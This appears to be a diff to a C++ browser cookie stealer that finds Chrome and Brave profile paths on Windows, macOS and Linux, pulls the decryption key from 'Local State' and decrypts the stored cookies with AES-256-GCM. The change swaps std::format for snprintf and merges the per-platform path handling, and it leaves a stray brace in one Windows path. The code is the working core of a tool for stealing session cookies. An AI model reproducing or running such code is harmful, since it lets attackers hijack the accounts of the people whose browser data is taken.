@@ -15,11 +15,11 @@
 #ifdef _WIN32
     #include "base64.hpp"
     #include <Windows.h>
-    #include <format>
     #include <Lmcons.h>
     #pragma comment(lib, "ws2_32.lib")
     #pragma comment (lib, "crypt32")
     #define ITERATION     1 
+    #define PATH_MAX MAX_PATH
 #elif __APPLE_
     #define ITERATION     1003 
 #elif __linux__
@@ -41,20 +41,20 @@
 #ifdef _WIN32
 // old "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies"
 #define PATH_COOKIES_ON_PROFILE "Network\\Cookies"
-#define CHROME_COOKIES_PATH "C:\\Users\\{}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies" 
+#define CHROME_COOKIES_PATH "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies" 
 #elif __APPLE_
 #define PATH_COOKIES_ON_PROFILE "Cookies"
-#define CHROME_COOKIES_PATH "{}/Library/Application Support/Google/Chrome/Default/Cookies"
+#define CHROME_COOKIES_PATH "%s/Library/Application Support/Google/Chrome/Default/Cookies"
 #elif __linux__
 #define PATH_COOKIES_ON_PROFILE "Cookies"
-#define CHROME_COOKIES_PATH "{}/.config/google-chrome/Default/Cookies"
+#define CHROME_COOKIES_PATH "%s/.config/google-chrome/Default/Cookies"
 #endif //_WIN32
 
 
 std::vector<std::string> possibleBrowserPaths = {
 #ifdef _WIN32
-    "C:\\Users\\{}\\AppData\\Local\\Google\\Chrome\\User Data\\",
-    "C:\\Users\\{}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\"
+    "C:\\Users\\%s}\\AppData\\Local\\Google\\Chrome\\User Data\\",
+    "C:\\Users\\%s\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\"
 #elif __APPLE_
     "%s/Library/Application Support/Google/Chrome/",
     "%s/Library/Application Support/BraveSoftware"
@@ -197,9 +197,7 @@ std::string aes_256_gcm_decrypt(std::vector<unsigned char> ciphertext, std::stri
     if (!EVP_DecryptFinal(d_ctx, &plaintext[actual_size], &final_size)) {
         std::cerr << "[!] Error decrypting cookie" << std::endl;
     }
-    else {
-        std::cout << "[+] Success decrypting cookie" << std::endl;
-    }
+
     EVP_CIPHER_CTX_free(d_ctx);
     plaintext.resize(actual_size + final_size, '\0');
 
@@ -274,7 +272,9 @@ std::string get_key() {
         char username[UNLEN + 1];
         DWORD username_len = UNLEN + 1;
         GetUserName(username, &username_len);
-        cookies_path_user = fs::path(std::format(CHROME_COOKIES_PATH, username));
+        char cookies_path[PATH_MAX] = { 0 };
+        snprintf(cookies_path, PATH_MAX, CHROME_COOKIES_PATH, username);
+        cookies_path_user = fs::path(cookies_path);
     }
 
     auto local_state_file = (cookies_path_user.parent_path().parent_path().parent_path()) / fs::path("Local State");
@@ -469,12 +469,9 @@ std::vector<fs::path> findChrome(std::vector<std::string> defaultCookiesPath, st
     std::vector<fs::path> res;
 
     for (auto const& path : defaultCookiesPath) {
-#ifdef _WIN32
-        auto const path_user = std::format(path, username);
-#else
         char path_user[PATH_MAX] = { 0 };
-        snprintf(path_user, PATH_MAX, path, username);
-#endif
+        snprintf(path_user, PATH_MAX, path.c_str(), username);
+
         if (fs::exists(path_user)) {
             for (const auto& dirEntry : fs::directory_iterator(path_user, fs::directory_options::skip_permission_denied)) {
                 if (fs::exists(dirEntry / fs::path("Web Data")) && // Cookies is in different places in Windows than in Linux/OSX
@@ -510,12 +507,11 @@ int main(int argc, char** argv)
     char username[UNLEN + 1];
     DWORD username_len = UNLEN + 1;
     GetUserName(username, &username_len);
-    auto cookies_path = std::format(CHROME_COOKIES_PATH, username);
 #else
-    //auto cookies_path = std::format(CHROME_COOKIES_PATH, getenv("HOME"));
-    char cookies_path[PATH_MAX] = { 0 };
-    snprintf(cookies_path, PATH_MAX, CHROME_COOKIES_PATH, getenv("HOME"));
+    auto username = getenv("HOME");    
 #endif //_WIN32
+    char cookies_path[PATH_MAX] = { 0 };
+    snprintf(cookies_path, PATH_MAX, CHROME_COOKIES_PATH, username);
 
     // ToDo: Use the list of found browsers and decrypt all
     auto possibleCookies = findChrome(possibleBrowserPaths, username);
